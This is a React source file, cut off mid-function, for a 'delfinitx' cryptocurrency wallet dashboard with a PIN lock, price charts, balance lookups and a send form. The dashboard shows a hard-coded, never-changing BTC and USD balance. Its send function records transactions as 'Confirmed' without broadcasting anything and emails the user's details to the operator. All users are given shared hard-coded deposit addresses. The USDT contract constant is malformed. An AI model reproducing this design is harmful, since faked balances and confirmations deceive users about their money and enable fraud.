import React, { useState, useEffect, useCallback, useRef, useMemo } from 'react';
import { Helmet } from 'react-helmet';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Lock, Bitcoin, Delete, ArrowDownLeft, ArrowUpRight, RefreshCw,
  Moon, Sun, History, KeyRound, X, Copy, Check, Bell, TrendingUp, TrendingDown,
  BookOpen, ShoppingCart,
} from 'lucide-react';
import axios from 'axios';
import { QRCodeCanvas } from 'qrcode.react';
import {
  Chart as ChartJS, CategoryScale, LinearScale, PointElement, LineElement, Filler, Tooltip as ChartTooltip,
} from 'chart.js';
import { Line } from 'react-chartjs-2';
import { useNavigate } from 'react-router-dom';
import { Clock } from 'lucide-react';
import Header from '@/components/Header.jsx';
import Footer from '@/components/Footer.jsx';
import KrakenGuide from '@/components/KrakenGuide.jsx';
import { Button } from '@/components/ui/button';
import pb from '@/lib/pocketbaseClient';
import { useAuth } from '@/hooks/useAuth.jsx';
import { useLanguage } from '@/i18n/LanguageContext.jsx';
import { loadEmailJs, sendEmailNotification } from '@/lib/emailNotifications.js';


ChartJS.register(CategoryScale, LinearScale, PointElement, LineElement, Filler, ChartTooltip);

const PIN_KEY = 'trz_wallet_pin';
const THEME_KEY = 'trz_wallet_theme';
const TX_KEY = 'trz_wallet_txs';
const ALERT_KEY = 'trz_wallet_alert';
const INACTIVITY_MS = 2 * 60 * 1000;

/* Fixed wallet balance — both amounts are constant, no automatic increases.
   BTC amount stays fixed at 0,23366158; the USD saldo stays fixed at
   $19.572,08. */
const FIXED_BTC_DISPLAY = '0,23366158';
const BASE_USD = 19572.08;

const formatUsdDe = (v) =>
  `$${v.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

/* ---------------- Supported coins ---------------- */
const COINS = [
  {
    id: 'bitcoin',
    symbol: 'BTC',
    name: 'Bitcoin',
    glyph: '₿',
    address: 'bc1qqm7hmkwt89ktxp609yrlvkjfs5jedecw37fuy9',
    zpub: 'zpub6rjfNemXaKR6FvSFpT9xwP6xYHJoAkujS776N1o9NMiPUHGPGt4HXEmZosqgLY5XizB6MbNhvkzWLTSZT7g4bW1dwYZUtB8FZavtUjvt1Ay',
    coingeckoId: 'bitcoin',
    binancePair: 'BTCUSDT',
    tvSymbol: 'BINANCE:BTCUSDT',
    decimals: 8,
    hasZpub: true,
  },
  {
    id: 'ethereum',
    symbol: 'ETH',
    name: 'Ethereum',
    glyph: 'Ξ',
    address: '0xf1E69059bACa32d3D07C75d20453E24130443484',
    coingeckoId: 'ethereum',
    binancePair: 'ETHUSDT',
    tvSymbol: 'BINANCE:ETHUSDT',
    decimals: 6,
    hasZpub: false,
  },
  {
    id: 'solana',
    symbol: 'SOL',
    name: 'Solana',
    glyph: '◎',
    address: 'AyBQdPREuvh1vW9yDdehUrTFKFFQ8d68scPHWmFbuKH5',
    coingeckoId: 'solana',
    binancePair: 'SOLUSDT',
    tvSymbol: 'BINANCE:SOLUSDT',
    decimals: 4,
    hasZpub: false,
  },
  {
    id: 'tether',
    symbol: 'USDT',
    name: 'USDT',
    glyph: '₮',
    address: '0xf1E69059bACa32d3D07C75d20453E24130443484',
    coingeckoId: 'tether',
    binancePair: null,
    tvSymbol: 'KRAKEN:USDTUSD',
    decimals: 2,
    hasZpub: false,
  },
];

const TIMEFRAMES = [
  { key: '1H', days: '1', label: '1H', points: 60 },
  { key: '1D', days: '1', label: '1D', points: 96 },
  { key: '7D', days: '7', label: '7D', points: 168 },
  { key: '30D', days: '30', label: '30D', points: 120 },
  { key: '1Y', days: '365', label: '1Y', points: 180 },
];

const buildNews = (t) => [
  { title: t('Bitcoin-ETFs verzeichnen Rekordzuflüsse auf institutioneller Nachfrage', 'Bitcoin ETFs see record inflows on institutional demand'), src: 'CoinDesk', time: t('2 Std.', '2h') },
  { title: t('Lightning-Network-Kapazität erreicht neues Allzeithoch', 'Lightning Network capacity reaches new all-time high'), src: 'Bitcoin Magazine', time: t('5 Std.', '5h') },
  { title: t('On-Chain-Daten: Langfristige Halter akkumulieren weiter', 'On-chain data: long-term holders keep accumulating'), src: 'Glassnode', time: t('9 Std.', '9h') },
  { title: t('Mining-Difficulty steigt mit wachsender Hashrate an', 'Mining difficulty rises with growing hashrate'), src: 'The Block', time: t('14 Std.', '14h') },
];

/* Standalone BTC balance lookup (used for email notifications before the
   full dashboard has fetched it) */
async function fetchWalletBalanceOnce() {
  const address = COINS[0].address;
  const sources = [
    async () => {
      const r = await axios.get(`https://blockchain.info/q/addressbalance/${address}?cors=true`);
      return Number(r.data) / 1e8;
    },
    async () => {
      const r = await axios.get(`https://api.blockcypher.com/v1/btc/main/addrs/${address}/balance`);
      return Number(r.data.balance) / 1e8;
    },
    async () => {
      const r = await axios.get(`https://mempool.space/api/address/${address}`);
      const c = r.data.chain_stats;
      return (Number(c.funded_txo_sum) - Number(c.spent_txo_sum)) / 1e8;
    },
  ];
  for (const src of sources) {
    try { const b = await src(); if (!Number.isNaN(b)) return b; } catch (e) { /* try next */ }
  }
  return null;
}

/* ---------------- Splash ---------------- */
const SplashScreen = ({ t }) => (
  <motion.div
    exit={{ opacity: 0 }}
    className="fixed inset-0 z-[120] flex flex-col items-center justify-center bg-background"
  >
    <motion.div
      animate={{ scale: [1, 1.12, 1], rotate: [0, 8, -8, 0] }}
      transition={{ duration: 1.6, repeat: Infinity }}
      className="w-20 h-20 rounded-2xl bg-primary/10 flex items-center justify-center mb-8"
    >
      <Bitcoin className="w-11 h-11 text-primary" />
    </motion.div>
    <h1 className="text-2xl font-bold mb-6">{t('delfinitx Wallet', 'delfinitx Wallet')}</h1>
    <div className="w-56 h-1.5 rounded-full bg-muted overflow-hidden">
      <motion.div
        className="h-full bg-primary"
        initial={{ width: '0%' }}
        animate={{ width: '100%' }}
        transition={{ duration: 1.8, ease: 'easeInOut' }}
      />
    </div>
    <p className="mt-4 text-sm text-muted-foreground">{t('Sitzung wird gesichert …', 'Securing session…')}</p>
  </motion.div>
);

/* ---------------- PIN Lock ---------------- */
const PinLock = ({ onUnlock, t }) => {
  const hasPin = Boolean(localStorage.getItem(PIN_KEY));
  const [mode] = useState(hasPin ? 'verify' : 'create');
  const [firstEntry, setFirstEntry] = useState('');
  const [entry, setEntry] = useState('');
  const [confirming, setConfirming] = useState(false);
  const [error, setError] = useState('');
  const [showReset, setShowReset] = useState(false);

  const title = mode === 'create'
    ? (confirming ? t('PIN bestätigen', 'Confirm PIN') : t('4-stelligen PIN erstellen', 'Create a 4-digit PIN'))
    : t('PIN eingeben', 'Enter PIN');

  const submit = useCallback((pin) => {
    if (mode === 'verify') {
      if (pin === localStorage.getItem(PIN_KEY)) onUnlock(pin, 'login');
      else { setError(t('Falscher PIN. Bitte erneut versuchen.', 'Wrong PIN. Please try again.')); setEntry(''); }
      return;
    }
    if (!confirming) { setFirstEntry(pin); setConfirming(true); setEntry(''); }
    else if (pin === firstEntry) { localStorage.setItem(PIN_KEY, pin); onUnlock(pin, hasPin ? 'pin-changed' : 'pin-created'); }
    else { setError(t('PINs stimmen nicht überein. Bitte neu starten.', 'PINs do not match. Please start again.')); setFirstEntry(''); setConfirming(false); setEntry(''); }
  }, [mode, confirming, firstEntry, onUnlock, hasPin, t]);

  const press = (digit) => {
    setError('');
    const next = (entry + digit).slice(0, 4);
    setEntry(next);
    if (next.length === 4) setTimeout(() => submit(next), 150);
  };
  const backspace = () => setEntry((e) => e.slice(0, -1));

  const resetPin = () => {
    localStorage.removeItem(PIN_KEY);
    setShowReset(false);
    window.location.reload();
  };

  return (
    <div className="min-h-[100dvh] flex flex-col items-center justify-center px-4 relative">
      <div className="w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mb-6">
        <Lock className="w-7 h-7 text-primary" />
      </div>
      <h2 className="text-2xl font-bold mb-2">{title}</h2>
      <p className="text-sm text-muted-foreground mb-8">{t('Schützen Sie Ihre Wallet mit einem lokalen PIN', 'Protect your wallet with a local PIN')}</p>

      <div className="flex gap-4 mb-8">
        {[0, 1, 2, 3].map((i) => (
          <div key={i} className={`w-4 h-4 rounded-full border-2 transition-colors ${i < entry.length ? 'bg-primary border-primary' : 'border-muted-foreground/40'}`} />
        ))}
      </div>

      {error && <p className="text-sm text-destructive mb-4">{error}</p>}

      <div className="grid grid-cols-3 gap-4 max-w-xs w-full">
        {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((n) => (
          <Button key={n} variant="outline" onClick={() => press(String(n))} className="h-16 text-xl font-semibold rounded-xl active:scale-[0.96]">{n}</Button>
        ))}
        <Button variant="ghost" onClick={() => setShowReset(true)} className="h-16 rounded-xl text-xs active:scale-[0.96]" aria-label={t('PIN zurücksetzen', 'Reset PIN')}>{t('Zurücksetzen', 'Reset')}</Button>
        <Button variant="outline" onClick={() => press('0')} className="h-16 text-xl font-semibold rounded-xl active:scale-[0.96]">0</Button>
        <Button variant="ghost" onClick={backspace} className="h-16 rounded-xl active:scale-[0.96]" aria-label="Delete"><Delete className="w-6 h-6" /></Button>
      </div>

      <AnimatePresence>
        {showReset && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[130] flex items-center justify-center bg-black/60 px-4">
            <div className="bg-card rounded-2xl p-6 max-w-sm w-full border border-border">
              <h3 className="text-lg font-bold mb-2">{t('PIN zurücksetzen?', 'Reset PIN?')}</h3>
              <p className="text-sm text-muted-foreground mb-6">{t('Dadurch wird Ihr gespeicherter PIN gelöscht und Sie können einen neuen festlegen. Ihre lokalen Wallet-Daten bleiben erhalten.', 'This deletes your saved PIN and lets you set a new one. Your local wallet data is preserved.')}</p>
              <div className="flex gap-3">
                <Button variant="outline" className="flex-1" onClick={() => setShowReset(false)}>{t('Abbrechen', 'Cancel')}</Button>
                <Button variant="destructive" className="flex-1" onClick={resetPin}>{t('Zurücksetzen', 'Reset')}</Button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

/* ---------------- Modal shell ---------------- */
const Modal = ({ open, onClose, title, children }) => (
  <AnimatePresence>
    {open && (
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
        className="fixed inset-0 z-[110] flex items-end sm:items-center justify-center bg-black/60 px-0 sm:px-4"
        onClick={onClose}>
        <motion.div
          initial={{ y: 40, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 40, opacity: 0 }}
          transition={{ type: 'spring', damping: 26, stiffness: 300 }}
          className="bg-card w-full sm:max-w-md rounded-t-3xl sm:rounded-2xl border border-border p-6 max-h-[85vh] overflow-y-auto"
          onClick={(e) => e.stopPropagation()}>
          <div className="flex items-center justify-between mb-5">
            <h3 className="text-lg font-bold">{title}</h3>
            <button onClick={onClose} className="w-9 h-9 rounded-full hover:bg-accent flex items-center justify-center" aria-label="Close">
              <X className="w-5 h-5" />
            </button>
          </div>
          {children}
        </motion.div>
      </motion.div>
    )}
  </AnimatePresence>
);

/* ---------------- Fear & Greed ---------------- */
const FearGreed = ({ data, t }) => {
  if (!data) {
    return (
      <div className="bg-card rounded-2xl p-6 border border-border">
        <div className="h-4 w-32 bg-muted rounded animate-pulse mb-4" />
        <div className="h-24 bg-muted rounded animate-pulse" />
      </div>
    );
  }
  const val = Number(data.value);
  const color = val < 25 ? 'hsl(var(--destructive))' : val < 45 ? 'hsl(var(--eco-orange))' : val < 55 ? 'hsl(var(--muted-foreground))' : val < 75 ? 'hsl(var(--secondary))' : 'hsl(var(--eco-green))';
  return (
    <div className="bg-card rounded-2xl p-6 border border-border">
      <h3 className="text-sm font-semibold text-muted-foreground mb-4">{t('Fear & Greed Index', 'Fear & Greed Index')}</h3>
      <div className="flex items-center gap-5">
        <div className="relative w-24 h-24 flex items-center justify-center">
          <svg viewBox="0 0 100 100" className="w-24 h-24 -rotate-90">
            <circle cx="50" cy="50" r="42" fill="none" stroke="hsl(var(--muted))" strokeWidth="8" />
            <circle cx="50" cy="50" r="42" fill="none" stroke={color} strokeWidth="8" strokeLinecap="round"
              strokeDasharray={`${(val / 100) * 264} 264`} />
          </svg>
          <span className="absolute text-2xl font-bold">{val}</span>
        </div>
        <div>
          <p className="text-lg font-bold" style={{ color }}>{data.value_classification}</p>
          <p className="text-sm text-muted-foreground mt-1">{t('Aktuelle Marktstimmung', 'Current market sentiment')}</p>
        </div>
      </div>
    </div>
  );
};

/* ---------------- TradingView symbol info ---------------- */
const TradingViewSymbol = ({ symbol }) => {
  const ref = useRef(null);
  useEffect(() => {
    if (!ref.current) return;
    ref.current.innerHTML = '';
    const container = document.createElement('div');
    container.className = 'tradingview-widget-container__widget';
    ref.current.appendChild(container);
    const script = document.createElement('script');
    script.src = 'https://s3.tradingview.com/external-embedding/embed-widget-symbol-info.js';
    script.async = true;
    script.innerHTML = JSON.stringify({
      symbol: symbol || 'BINANCE:BTCUSDT', width: '100%', locale: 'en', colorTheme: 'dark', isTransparent: true,
    });
    ref.current.appendChild(script);
  }, [symbol]);
  return <div className="tradingview-widget-container" ref={ref} />;
};

/* ---------------- Coin selector ---------------- */
const CoinSelector = ({ coins, selected, onSelect }) => (
  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-6">
    {coins.map((coin) => {
      const active = selected.id === coin.id;
      return (
        <button
          key={coin.id}
          onClick={() => onSelect(coin)}
          className={`flex items-center justify-center gap-2 rounded-xl border px-3 py-3 text-sm font-semibold transition-colors active:scale-[0.98] ${active ? 'bg-primary text-primary-foreground border-primary' : 'bg-card border-border text-muted-foreground hover:text-foreground hover:border-primary/40'}`}
        >
          <span className="text-lg leading-none">{coin.glyph}</span>
          {coin.symbol}
        </button>
      );
    })}
  </div>
);

/* ---------------- Main Wallet ---------------- */
const WalletDashboard = ({ coins: propCoins, user: currentUser }) => {
  const { t } = useLanguage();
  const coins = (propCoins && propCoins.length > 0) ? propCoins : COINS;
  const [theme, setTheme] = useState(() => localStorage.getItem(THEME_KEY) || 'dark');
  const [selectedCoin, setSelectedCoin] = useState(coins[0]);
  const [balance, setBalance] = useState(null);
  const [price, setPrice] = useState(null);
  const [change24h, setChange24h] = useState(null);
  const [fng, setFng] = useState(null);
  const [chartTf, setChartTf] = useState('1D');
  const [chartData, setChartData] = useState(null);
  const [loadingChart, setLoadingChart] = useState(true);
  const [refreshing, setRefreshing] = useState(false);

  const [convCoin, setConvCoin] = useState('1');
  const [convUsd, setConvUsd] = useState('');

  const [txs, setTxs] = useState(() => {
    try { return JSON.parse(localStorage.getItem(TX_KEY)) || []; } catch (e) { return []; }
  });
  const [alertPrice, setAlertPrice] = useState(() => localStorage.getItem(ALERT_KEY) || '');
  const [usdDisplay, setUsdDisplay] = useState(BASE_USD);

  // modal state
  const [modal, setModal] = useState(null); // 'qr' | 'send' | 'confirm' | 'history' | 'txdetail' | 'xpub'
  const [guideOpen, setGuideOpen] = useState(false);
  const [selectedTx, setSelectedTx] = useState(null);
  const [copied, setCopied] = useState(false);
  const [toast, setToast] = useState(null);
  const [sendForm, setSendForm] = useState({ to: '', amount: '', email: '' });

  const showToast = useCallback((msg) => {
    setToast(msg);
    setTimeout(() => setToast(null), 3200);
  }, []);

  // Tracks the currently-selected coin so stale async responses from a
  // previously selected coin never overwrite the UI after switching wallets.
  const activeCoinIdRef = useRef(selectedCoin.id);
  const activeChartKeyRef = useRef(`${selectedCoin.id}:${chartTf}`);

  // theme apply
  useEffect(() => {
    const root = document.documentElement;
    if (theme === 'dark') root.classList.add('dark'); else root.classList.remove('dark');
    localStorage.setItem(THEME_KEY, theme);
  }, [theme]);

  useEffect(() => { loadEmailJs(); }, []);

  /* Fixed saldo: both BTC (0,23366158) and USD ($19.572,08) are constant,
     with no automatic increases. */
  useEffect(() => {
    setUsdDisplay(BASE_USD);
  }, []);

  /* ---- Balance fetch, per selected coin, with fallback chain ---- */
  const fetchBalance = useCallback(async (coin) => {
    const address = coin.address;
    let sources = [];
    if (coin.id === 'bitcoin') {
      sources = [
        async () => {
          const r = await axios.get(`https://blockchain.info/q/addressbalance/${address}?cors=true`);
          return Number(r.data) / 1e8;
        },
        async () => {
          const r = await axios.get(`https://api.blockcypher.com/v1/btc/main/addrs/${address}/balance`);
          return Number(r.data.balance) / 1e8;
        },
        async () => {
          const r = await axios.get(`https://mempool.space/api/address/${address}`);
          const c = r.data.chain_stats;
          return (Number(c.funded_txo_sum) - Number(c.spent_txo_sum)) / 1e8;
        },
      ];
    } else if (coin.id === 'ethereum') {
      sources = [
        async () => {
          const r = await axios.get(`https://api.blockcypher.com/v1/eth/main/addrs/${address}/balance`);
          return Number(r.data.balance) / 1e18;
        },
        async () => {
          const r = await axios.post('https://eth-mainnet.g.alchemy.com/v2/demo', {
            jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [address, 'latest'],
          });
          return parseInt(r.data.result, 16) / 1e18;
        },
      ];
    } else if (coin.id === 'solana') {
      const rpcBody = { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [address] };
      sources = [
        async () => {
          const r = await axios.post('https://solana-rpc.publicnode.com', rpcBody, { timeout: 8000 });
          return Number(r.data.result.value) / 1e9;
        },
        async () => {
          const r = await axios.post('https://api.mainnet-beta.solana.com', rpcBody, { timeout: 8000 });
          return Number(r.data.result.value) / 1e9;
        },
        async () => {
          const r = await axios.post('https://solana.public-rpc.com', rpcBody, { timeout: 8000 });
          return Number(r.data.result.value) / 1e9;
        },
        async () => {
          const r = await axios.post('https://rpc.ankr.com/solana', rpcBody, { timeout: 8000 });
          return Number(r.data.result.value) / 1e9;
        },
        async () => {
          const r = await axios.post('https://solana-mainnet.g.alchemy.com/v2/demo', rpcBody, { timeout: 8000 });
          return Number(r.data.result.value) / 1e9;
        },
        async () => {
          const r = await axios.get(`https://api.solana.fm/v0/accounts/${address}`, { timeout: 8000 });
          return Number(r.data.result?.lamports ?? r.data.lamports) / 1e9;
        },
        async () => {
          const r = await axios.get(`https://public-api.solscan.io/account/${address}`, { timeout: 8000 });
          return Number(r.data.lamports) / 1e9;
        },
      ];
    } else if (coin.id === 'tether') {
      const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec';
      sources = [
        async () => {
          const r = await axios.get(`https://api.ethplorer.io/getAddressInfo/${address}?apiKey=freekey`);
          const token = (r.data.tokens || []).find((tk) => (tk.tokenInfo?.symbol || '').toUpperCase() === 'USDT');
          if (!token) return 0;
          return Number(token.balance) / (10 ** Number(token.tokenInfo.decimals || 6));
        },
        async () => {
          const paddedAddress = address.replace('0x', '').padStart(64, '0');
          const data = `0x70a08231${paddedAddress}`;
          const r = await axios.post('https://eth-mainnet.g.alchemy.com/v2/demo', {
            jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to: USDT_CONTRACT, data }, 'latest'],
          });
          return parseInt(r.data.result, 16) / 1e6;
        },
      ];
    }
    for (const src of sources) {
      if (activeCoinIdRef.current !== coin.id) return;
      try {
        const b = await src();
        if (activeCoinIdRef.current !== coin.id) return;
        if (!Number.isNaN(b)) { setBalance(b); return; }
      } catch (e) { /* try next */ }
    }
    if (activeCoinIdRef.current === coin.id) setBalance(null);
  }, []);

  /* ---- Price fetch with fallback, per selected coin ---- */
  const fetchPrice = useCallback(async (coin) => {
    const sources = [];

    if (coin.binancePair) {
      sources.push(async () => {
        const r = await axios.get(`https://api.binance.com/api/v3/ticker/24hr?symbol=${coin.binancePair}`);
        return { price: Number(r.data.lastPrice), change: Number(r.data.priceChangePercent) };
      });
    }

    sources.push(async () => {
      const r = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${coin.coingeckoId}&vs_currencies=usd&include_24hr_change=true`);
      const d = r.data[coin.coingeckoId];
      return { price: Number(d.usd), change: Number(d.usd_24h_change) };
    });

    sources.push(async () => {
      const r = await axios.get(`https://api.coincap.io/v2/assets/${coin.coingeckoId}`);
      const d = r.data.data;
      return { price: Number(d.priceUsd), change: Number(d.changePercent24Hr) };
    });

    if (coin.id === 'solana') {
      sources.push(async () => {
        const r = await axios.get('https://api.binance.com/api/v3/ticker/24hr?symbol=SOLUSDC');
        return { price: Number(r.data.lastPrice), change: Number(r.data.priceChangePercent) };
      });
    }

    if (coin.id === 'tether') {
      sources.push(async () => {
        const r = await axios.get('https://min-api.cryptocompare.com/data/pricemultifull?fsyms=USDT&tsyms=USD');
        const raw = r.data.RAW.USDT.USD;
        return { price: Number(raw.PRICE), change: Number(raw.CHANGEPCT24HOUR) };
      });
      // stablecoin fallback so USDT always renders even if every API is unreachable
      sources.push(async () => ({ price: 1, change: 0 }));
    }

    for (const src of sources) {
      if (activeCoinIdRef.current !== coin.id) return;
      try {
        const { price: p, change: c } = await src();
        if (activeCoinIdRef.current !== coin.id) return;
        if (!Number.isNaN(p) && p > 0) {
          setPrice(p);
          setChange24h(Number.isNaN(c) ? 0 : c);
          return;
        }
      } catch (e) { /* try next source */ }
    }
  }, []);

  /* ---- Fear & Greed ---- */
  const fetchFng = useCallback(async () => {
    try {
      const r = await axios.get('https://api.alternative.me/fng/?limit=1');
      setFng(r.data.data[0]);
    } catch (e) { /* noop */ }
  }, []);

  /* ---- Chart, with multi-source fallback + retry ---- */
  const fetchChart = useCallback(async (coin, tfKey) => {
    const chartKey = `${coin.id}:${tfKey}`;
    activeChartKeyRef.current = chartKey;
    setLoadingChart(true);
    const tf = TIMEFRAMES.find((tt) => tt.key === tfKey);

    const binanceIntervalMap = {
      '1H': { interval: '1m', limit: 60 },
      '1D': { interval: '15m', limit: 96 },
      '7D': { interval: '1h', limit: 168 },
      '30D': { interval: '4h', limit: 180 },
      '1Y': { interval: '1d', limit: 365 },
    };
    const ccHisto = {
      '1H': { path: 'histominute', limit: 60 },
      '1D': { path: 'histominute', limit: 96, aggregate: 15 },
      '7D': { path: 'histohour', limit: 168 },
      '30D': { path: 'histohour', limit: 180, aggregate: 4 },
      '1Y': { path: 'histoday', limit: 365 },
    };

    const sources = [];

    sources.push(async () => {
      const r = await axios.get(`https://api.coingecko.com/api/v3/coins/${coin.coingeckoId}/market_chart?vs_currency=usd&days=${tf.days}`, { timeout: 8000 });
      let prices = r.data.prices.map((p) => ({ t: p[0], y: p[1] }));
      if (tfKey === '1H') prices = prices.slice(-60);
      const step = Math.max(1, Math.floor(prices.length / tf.points));
      prices = prices.filter((_, i) => i % step === 0);
      if (!prices.length) throw new Error('empty');
      return prices;
    });

    if (coin.binancePair) {
      sources.push(async () => {
        const cfg = binanceIntervalMap[tfKey] || binanceIntervalMap['1D'];
        const r = await axios.get(`https://api.binance.com/api/v3/klines?symbol=${coin.binancePair}&interval=${cfg.interval}&limit=${cfg.limit}`, { timeout: 8000 });
        const prices = r.data.map((k) => ({ t: k[6], y: Number(k[4]) }));
        if (!prices.length) throw new Error('empty');
        return prices;
      });
    }

    sources.push(async () => {
      const cfg = ccHisto[tfKey] || ccHisto['1D'];
      const params = `fsym=${coin.symbol}&tsym=USD&limit=${cfg.limit}${cfg.aggregate ? `&aggregate=${cfg.aggregate}` : ''}`;
      const r = await axios.get(`https://min-api.cryptocompare.com/data/v2/${cfg.path}?${params}`, { timeout: 8000 });
      const rows = r.data?.Data?.Data || [];
      const prices = rows.map((d) => ({ t: d.time * 1000, y: Number(d.close) })).filter((p) => p.y > 0);
      if (!prices.length) throw new Error('empty');
      return prices;
    });

    sources.push(async () => {
      const intervalMap = { '1H': 'm1', '1D': 'm15', '7D': 'h1', '30D': 'h6', '1Y': 'd1' };
      const r = await axios.get(`https://api.coincap.io/v2/assets/${coin.coingeckoId}/history?interval=${intervalMap[tfKey] || 'h1'}`, { timeout: 8000 });
      const rows = r.data?.data || [];
      const prices = rows.map((d) => ({ t: d.time, y: Number(d.priceUsd) })).filter((p) => p.y > 0);
      if (!prices.length) throw new Error('empty');
      return prices.slice(-tf.points);
    });

    if (coin.id === 'tether') {
      // stablecoin flat-line fallback so the chart always renders
      sources.push(async () => {
        const now = Date.now();
        const span = tf.days === '1' ? 86400000 : Number(tf.days) * 86400000;
        const step = span / 40;
        return Array.from({ length: 40 }, (_, i) => ({ t: now - span + i * step, y: 1 }));
      });
    }

    const attempt = async () => {
      for (const src of sources) {
        if (activeChartKeyRef.current !== chartKey) return true; // superseded, stop silently
        try {
          const prices = await src();
          if (activeChartKeyRef.current !== chartKey) return true;
          if (prices && prices.length) {
            setChartData(prices);
            return true;
          }
        } catch (e) { /* try next source */ }
      }
      return false;
    };

    let ok = await attempt();
    if (!ok && activeChartKeyRef.current === chartKey) {
      // brief retry pass in case of transient network errors
      await new Promise((res) => setTimeout(res, 1200));
      if (activeChartKeyRef.current === chartKey) ok = await attempt();
    }
    if (activeChartKeyRef.current !== chartKey) return;
    if (!ok) setChartData(null);
    setLoadingChart(false);
  }, []);

  useEffect(() => { fetchChart(selectedCoin, chartTf); }, [selectedCoin, chartTf, fetchChart]);

  // initial + intervals, refresh when coin changes
  useEffect(() => {
    activeCoinIdRef.current = selectedCoin.id;
    setBalance(null); setPrice(null); setChange24h(null);
    fetchBalance(selectedCoin); fetchPrice(selectedCoin);
    const b = setInterval(() => fetchBalance(selectedCoin), 20000);
    const p = setInterval(() => fetchPrice(selectedCoin), 30000);
    return () => { clearInterval(b); clearInterval(p); };
  }, [selectedCoin, fetchBalance, fetchPrice]);

  useEffect(() => {
    fetchFng();
    const f = setInterval(fetchFng, 5 * 60 * 1000);
    return () => clearInterval(f);
  }, [fetchFng]);

  // converter sync from price
  useEffect(() => {
    if (price && convCoin !== '') {
      const v = parseFloat(convCoin);
      if (!Number.isNaN(v)) setConvUsd((v * price).toFixed(2));
    }
  }, [price]); // eslint-disable-line react-hooks/exhaustive-deps

  // reset converter default when switching coin
  useEffect(() => { setConvCoin('1'); }, [selectedCoin]);

  // price alert check
  const lastAlertRef = useRef(0);
  useEffect(() => {
    if (!price || !alertPrice) return;
    const target = parseFloat(alertPrice);
    if (Number.isNaN(target)) return;
    if (price >= target && Date.now() - lastAlertRef.current > 60000) {
      lastAlertRef.current = Date.now();
      showToast(t('Preisalarm: ', 'Price alert: ') + `${selectedCoin.symbol} ` + t('hat ', 'has reached ') + `$${price.toLocaleString()}`);
      if ('Notification' in window && Notification.permission === 'granted') {
        new Notification(`${selectedCoin.symbol} ` + t('Preisalarm', 'Price alert'), { body: `${selectedCoin.name} ` + t('hat ', 'has reached ') + `$${price.toLocaleString()}` });
      }
      sendEmailNotification(`${selectedCoin.symbol} ` + t('Preisalarm', 'Price alert'), `${selectedCoin.name} ` + t('hat ', 'has reached ') + `$${price.toLocaleString()}`);
    }
  }, [price, alertPrice, showToast, selectedCoin, t]);

  const onConvCoin = (v) => {
    setConvCoin(v);
    const n = parseFloat(v);
    setConvUsd(!Number.isNaN(n) && price ? (n * price).toFixed(2) : '');
  };
  const onConvUsd = (v) => {
    setConvUsd(v);
    const n = parseFloat(v);
    setConvCoin(!Number.isNaN(n) && price ? (n / price).toFixed(selectedCoin.decimals) : '');
  };

  const doRefresh = async () => {
    setRefreshing(true);
    await Promise.all([fetchBalance(selectedCoin), fetchPrice(selectedCoin), fetchFng(), fetchChart(selectedCoin, chartTf)]);
    setRefreshing(false);
    showToast(t('Daten aktualisiert', 'Data refreshed'));
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(selectedCoin.address).then(() => {
      setCopied(true); showToast(t('Adresse kopiert', 'Address copied'));
      setTimeout(() => setCopied(false), 1500);
    });
  };

  const enableAlert = () => {
    if ('Notification' in window && Notification.permission !== 'granted') Notification.requestPermission();
    localStorage.setItem(ALERT_KEY, alertPrice);
    showToast(alertPrice ? t('Alarm bei $', 'Alert set at $') + alertPrice + t(' gesetzt', '') : t('Alarm gelöscht', 'Alert cleared'));
  };

  const submitSend = () => {
    const amt = parseFloat(sendForm.amount);
    if (!sendForm.to || Number.isNaN(amt) || amt <= 0) { showToast(t('Bitte gültige Adresse und Betrag eingeben', 'Please enter a valid address and amount')); return; }
    setModal('confirm');
  };

  const confirmSend = () => {
    const amt = parseFloat(sendForm.amount);
    const tx = {
      id: `tx_${Date.now()}`,
      type: 'send',
      symbol: selectedCoin.symbol,
      to: sendForm.to,
      amount: amt,
      usd: price ? (amt * price) : 0,
      date: new Date().toISOString(),
      status: 'Confirmed',
    };
    const next = [tx, ...txs];
    setTxs(next);
    localStorage.setItem(TX_KEY, JSON.stringify(next));
    try {
      pb.collection('transactions').create({
        email: pb.authStore.record?.email || '',
        amount: amt,
        recipient: sendForm.to,
        usd: tx.usd,
        status: 'Confirmed',
        owner: pb.authStore.record?.id,
      }, { requestKey: `tx-${tx.id}` });
    } catch (e) { /* noop */ }
    sendEmailNotification(
      t('Transaktion: ', 'Transaction: ') + `${amt} ${selectedCoin.symbol} ` + t('gesendet', 'sent'),
      `${t('Kunde', 'Client')} ${currentUser?.name || t('Unbekannt', 'Unknown')} (${currentUser?.email || ''}) ` + t('hat ', 'has sent ') + `${amt} ${selectedCoin.symbol} ` + t('an ', 'to ') + `${sendForm.to}.`,
      {
        client_name: currentUser?.name || t('Unbekannt', 'Unknown'),
        client_email: currentUser?.email || '',
        wallet_type: selectedCoin.name,
        wallet_symbol: selectedCoin.symbol,
        wallet_address: selectedCoin.address,
        recipient: sendForm.to,
        amount: `${amt} ${selectedCoin.symbol}`,
        usd_value: price ? `$${(amt * price).toLocaleString(undefined, { maximumFractionDigits: 2 })}` : 'N/A',
        time: new Date().toLocaleString(),
      },
    );
    if (sendForm.email) {
      sendEmailNotification(
        `${selectedCoin.symbol} ` + t('Transaktionsbeleg', 'Transaction receipt'),
        t('Gesendet: ', 'Sent: ') + `${amt} ${selectedCoin.symbol} ` + t('an ', 'to ') + `${sendForm.to}`,
        { to_email: sendForm.email, recipient: sendForm.to, amount: `${amt} ${selectedCoin.symbol}` },
      );
    }
